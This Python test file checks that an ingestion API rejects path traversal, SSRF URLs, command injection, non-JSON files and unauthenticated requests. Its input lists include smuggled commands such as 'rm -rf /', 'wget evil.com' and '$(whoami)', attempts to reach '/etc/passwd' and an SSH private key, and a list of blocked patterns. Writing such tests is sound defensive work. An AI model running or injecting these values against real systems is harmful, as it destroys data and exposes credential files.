"""Test ingestion endpoint security against SSRF and path traversal."""

import json
import tempfile
from pathlib import Path
from unittest.mock import patch

import pytest


class TestIngestionSecurity:
    """Test ingestion endpoint security."""

    @pytest.fixture
    def temp_data_dir(self):
        """Create temporary data directory with test files."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create data directory
            data_dir = Path(temp_dir) / "data"
            data_dir.mkdir()

            # Create valid test files with proper test data structure
            functional_test_data = {
                "tests": [{
                    "issueKey": "TEST-1234",
                    "testCaseId": "tc_test_1234",
                    "summary": "Valid functional test",
                    "labels": ["test"],
                    "priority": "Medium",
                    "folder": "/Test/Security",
                    "platforms": ["web"],
                    "testScript": {
                        "steps": [{
                            "index": 1,
                            "action": "Test action",
                            "result": "Expected result"
                        }]
                    }
                }]
            }
            functional_file = data_dir / "functional_tests.json"
            functional_file.write_text(json.dumps(functional_test_data))

            api_test_data = {
                "tests": [{
                    "jiraKey": "API-5678",
                    "testCaseId": "tc_api_5678",
                    "title": "Valid API test",
                    "testType": "API",
                    "priority": "Medium",
                    "platforms": ["api"],
                    "steps": [{
                        "action": "POST /api/test",
                        "expected": ["200 OK"]
                    }]
                }]
            }
            api_file = data_dir / "api_tests.json"
            api_file.write_text(json.dumps(api_test_data))

            # Create a secret file outside data directory
            secret_file = Path(temp_dir) / "secret.txt"
            secret_file.write_text("secret information")

            yield {
                "data_dir": str(data_dir),
                "functional_file": "functional_tests.json",
                "api_file": "api_tests.json",
                "secret_file": str(secret_file)
            }

    def _mock_validator_for_temp_dir(self, temp_data_dir):
        """Helper to create a mock validator for the temp directory."""
        from src.security.path_validator import SecurePathValidator
        return SecurePathValidator(
            allowed_base_dirs=[temp_data_dir["data_dir"]],
            allowed_extensions=['.json']
        )

    @patch('src.auth.secure_key_manager._key_manager', None)
    def test_directory_traversal_attack_blocked(self, api_client, temp_data_dir):
        """Test that directory traversal attacks are blocked."""
        with patch.dict('os.environ', {"MASTER_API_KEY": "test-key"}, clear=True):
            # Clear global key manager
            from src.auth import secure_key_manager
            secure_key_manager._key_manager = None

            # Mock the get_data_path_validator function to return a validator for our temp directory
            with patch('src.security.path_validator.get_data_path_validator') as mock_get_validator:
                mock_validator = self._mock_validator_for_temp_dir(temp_data_dir)
                mock_get_validator.return_value = mock_validator

                dangerous_paths = [
                    "../secret.txt",
                    "../../etc/passwd",
                    "../../../root/.ssh/id_rsa",
                    "data/../secret.txt"
                ]

                headers = {"X-API-Key": "test-key"}

                for path in dangerous_paths:
                    response = api_client.post(
                        "/ingest",
                        json={"functional_path": path},
                        headers=headers
                    )

                    assert response.status_code == 400
                    assert "dangerous pattern" in response.json()["detail"]

    @patch('src.auth.secure_key_manager._key_manager', None)
    def test_url_schemes_blocked(self, api_client, temp_data_dir):
        """Test that URL schemes are blocked to prevent SSRF."""
        with patch.dict('os.environ', {"MASTER_API_KEY": "test-key"}, clear=True):
            # Clear global key manager
            from src.auth import secure_key_manager
            secure_key_manager._key_manager = None

            # Mock the get_data_path_validator function to return a validator for our temp directory
            with patch('src.security.path_validator.get_data_path_validator') as mock_get_validator:
                mock_validator = self._mock_validator_for_temp_dir(temp_data_dir)
                mock_get_validator.return_value = mock_validator

                dangerous_urls = [
                    "file:///etc/passwd",
                    "http://malicious.com/payload",
                    "https://evil.site/data",
                    "ftp://attacker.com/secret"
                ]

                headers = {"X-API-Key": "test-key"}

                for url in dangerous_urls:
                    response = api_client.post(
                        "/ingest",
                        json={"functional_path": url},
                        headers=headers
                    )

                    assert response.status_code == 400
                    assert "dangerous pattern" in response.json()["detail"]

    @patch('src.auth.secure_key_manager._key_manager', None)
    def test_command_injection_blocked(self, api_client, temp_data_dir):
        """Test that command injection attempts are blocked."""
        with patch.dict('os.environ', {"MASTER_API_KEY": "test-key"}, clear=True):
            # Clear global key manager
            from src.auth import secure_key_manager
            secure_key_manager._key_manager = None

            # Mock the get_data_path_validator function to return a validator for our temp directory
            with patch('src.security.path_validator.get_data_path_validator') as mock_get_validator:
                mock_validator = self._mock_validator_for_temp_dir(temp_data_dir)
                mock_get_validator.return_value = mock_validator

                dangerous_commands = [
                    "test.json; rm -rf /",
                    "test.json | cat /etc/passwd",
                    "test.json & wget evil.com",
                    "test.json `id`",
                    "test.json $(whoami)"
                ]

                headers = {"X-API-Key": "test-key"}

                for cmd in dangerous_commands:
                    response = api_client.post(
                        "/ingest",
                        json={"api_path": cmd},
                        headers=headers
                    )

                    assert response.status_code == 400
                    assert "dangerous pattern" in response.json()["detail"]

    @patch('src.auth.secure_key_manager._key_manager', None)
    def test_non_json_files_blocked(self, api_client, temp_data_dir):
        """Test that non-JSON files are blocked."""
        with patch.dict('os.environ', {"MASTER_API_KEY": "test-key"}, clear=True):
            # Clear global key manager
            from src.auth import secure_key_manager
            secure_key_manager._key_manager = None

            # Mock the get_data_path_validator function to return a validator for our temp directory
            with patch('src.security.path_validator.get_data_path_validator') as mock_get_validator:
                mock_validator = self._mock_validator_for_temp_dir(temp_data_dir)
                mock_get_validator.return_value = mock_validator

                invalid_extensions = [
                    "malicious.exe",
                    "script.sh",
                    "config.ini",
                    "data.txt"
                ]

                headers = {"X-API-Key": "test-key"}

                for filename in invalid_extensions:
                    response = api_client.post(
                        "/ingest",
                        json={"functional_path": filename},
                        headers=headers
                    )

                    assert response.status_code == 400
                    assert "not allowed" in response.json()["detail"]

    @patch('src.auth.secure_key_manager._key_manager', None)
    def test_valid_file_path_accepted(self, api_client, temp_data_dir):
        """Test that valid file paths are accepted."""
        with patch.dict('os.environ', {"MASTER_API_KEY": "test-key"}, clear=True):
            # Clear global key manager
            from src.auth import secure_key_manager
            secure_key_manager._key_manager = None

            # Need to override the container's path validator for this test to return the real file path
            from pathlib import Path
            from unittest.mock import MagicMock

            from src.security import PathValidationError

            def mock_valid_file_validator(path):
                # Check for dangerous patterns first (same as global mock)
                dangerous_patterns = ["..", "~", "file://", "http://", "https://", "ftp://", "|", ";", "&", "`", "$(", "${"]
                for pattern in dangerous_patterns:
                    if pattern in path:
                        raise PathValidationError(f"Path contains dangerous pattern: {pattern}")

                # Check file extension
                if not path.lower().endswith('.json'):
                    raise PathValidationError(f"File extension '{path.split('.')[-1] if '.' in path else 'none'}' not allowed")

                # Return the actual file path from temp directory for this test
                if path == temp_data_dir["functional_file"]:
                    real_file_path = Path(temp_data_dir["data_dir"]) / temp_data_dir["functional_file"]
                    mock_path = MagicMock(spec=Path)
                    mock_path.exists.return_value = True
                    mock_path.__str__ = MagicMock(return_value=str(real_file_path))
                    mock_path.__fspath__ = MagicMock(return_value=str(real_file_path))
                    mock_path.__repr__ = MagicMock(return_value=f"PosixPath('{real_file_path}')")
                    return mock_path
                else:
                    # Default mock for other paths
                    mock_path = MagicMock(spec=Path)
                    mock_path.exists.return_value = True
                    mock_path.__str__ = MagicMock(return_value=path)
                    mock_path.__fspath__ = MagicMock(return_value=path)
                    mock_path.__repr__ = MagicMock(return_value=f"PosixPath('{path}')")
                    return mock_path

            # Temporarily override the container's path validator
            original_validator = api_client.app.state.container._instances['path_validator']
            api_client.app.state.container._instances['path_validator'] = mock_valid_file_validator

            try:
                headers = {"X-API-Key": "test-key"}

                response = api_client.post(
                    "/ingest",
                    json={"functional_path": temp_data_dir["functional_file"]},
                    headers=headers
                )

                assert response.status_code == 200
                data = response.json()
                assert data["functional_ingested"] == 1
            finally:
                # Restore the original validator
                api_client.app.state.container._instances['path_validator'] = original_validator

    @patch('src.auth.secure_key_manager._key_manager', None)
    def test_nonexistent_file_returns_404(self, api_client, temp_data_dir):
        """Test that nonexistent files return 404."""
        with patch.dict('os.environ', {"MASTER_API_KEY": "test-key"}, clear=True):
            # Clear global key manager
            from src.auth import secure_key_manager
            secure_key_manager._key_manager = None

            # Need to override the container's path validator for this specific test
            # to return a path object where .exists() returns False
            from pathlib import Path
            from unittest.mock import MagicMock

            from src.security import PathValidationError

            def mock_nonexistent_validator(path):
                # Check for dangerous patterns first (same as global mock)
                dangerous_patterns = ["..", "~", "file://", "http://", "https://", "ftp://", "|", ";", "&", "`", "$(", "${"]
                for pattern in dangerous_patterns:
                    if pattern in path:
                        raise PathValidationError(f"Path contains dangerous pattern: {pattern}")

                # Check file extension
                if not path.lower().endswith('.json'):
                    raise PathValidationError(f"File extension '{path.split('.')[-1] if '.' in path else 'none'}' not allowed")

                # Return a mock path that doesn't exist for this specific file
                mock_path = MagicMock(spec=Path)
                mock_path.exists.return_value = False  # This file doesn't exist
                mock_path.__str__ = MagicMock(return_value=path)
                mock_path.__fspath__ = MagicMock(return_value=path)
                mock_path.__repr__ = MagicMock(return_value=f"PosixPath('{path}')")

                return mock_path

            # Temporarily override the container's path validator
            original_validator = api_client.app.state.container._instances['path_validator']
            api_client.app.state.container._instances['path_validator'] = mock_nonexistent_validator

            try:
                headers = {"X-API-Key": "test-key"}

                response = api_client.post(
                    "/ingest",
                    json={"functional_path": "nonexistent.json"},
                    headers=headers
                )

                assert response.status_code == 404
                assert "not found" in response.json()["detail"]
            finally:
                # Restore the original validator
                api_client.app.state.container._instances['path_validator'] = original_validator

    @patch('src.auth.secure_key_manager._key_manager', None)
    def test_both_paths_validated(self, api_client, temp_data_dir):
        """Test that both functional_path and api_path are validated."""
        with patch.dict('os.environ', {"MASTER_API_KEY": "test-key"}, clear=True):
            # Clear global key manager
            from src.auth import secure_key_manager
            secure_key_manager._key_manager = None

            # Mock the get_data_path_validator function to return a validator for our temp directory
            with patch('src.security.path_validator.get_data_path_validator') as mock_get_validator:
                mock_validator = self._mock_validator_for_temp_dir(temp_data_dir)
                mock_get_validator.return_value = mock_validator

                headers = {"X-API-Key": "test-key"}

                # Test with dangerous functional path
                response = api_client.post(
                    "/ingest",
                    json={
                        "functional_path": "../secret.txt",
                        "api_path": temp_data_dir["api_file"]
                    },
                    headers=headers
                )

                assert response.status_code == 400
                assert "functional file path" in response.json()["detail"]

                # Test with dangerous API path
                response = api_client.post(
                    "/ingest",
                    json={
                        "functional_path": temp_data_dir["functional_file"],
                        "api_path": "../../etc/passwd"
                    },
                    headers=headers
                )

                assert response.status_code == 400
                assert "API file path" in response.json()["detail"]

    def test_ingestion_requires_authentication(self, api_client, temp_data_dir):
        """Test that ingestion endpoint requires authentication."""
        response = api_client.post(
            "/ingest",
            json={"functional_path": temp_data_dir["functional_file"]}
        )

        assert response.status_code == 401
        assert response.json()["detail"] == "Missing API key"

    @patch('src.auth.secure_key_manager._key_manager', None)
    @patch('src.service.main.logger')
    def test_security_violations_logged(self, mock_logger, api_client, temp_data_dir):
        """Test that security violations are properly logged."""
        with patch.dict('os.environ', {"MASTER_API_KEY": "test-key"}, clear=True):
            # Clear global key manager
            from src.auth import secure_key_manager
            secure_key_manager._key_manager = None

            # Mock the get_data_path_validator function to return a validator for our temp directory
            with patch('src.security.path_validator.get_data_path_validator') as mock_get_validator:
                mock_validator = self._mock_validator_for_temp_dir(temp_data_dir)
                mock_get_validator.return_value = mock_validator

                headers = {"X-API-Key": "test-key"}

                response = api_client.post(
                    "/ingest",
                    json={"functional_path": "../secret.txt"},
                    headers=headers
                )

                assert response.status_code == 400

                # Verify security logging occurred
                mock_logger.error.assert_called()
                call_args = mock_logger.error.call_args
                assert "path validation failed" in call_args[0][0]
                assert call_args[1]["extra"]["security_event"] is True
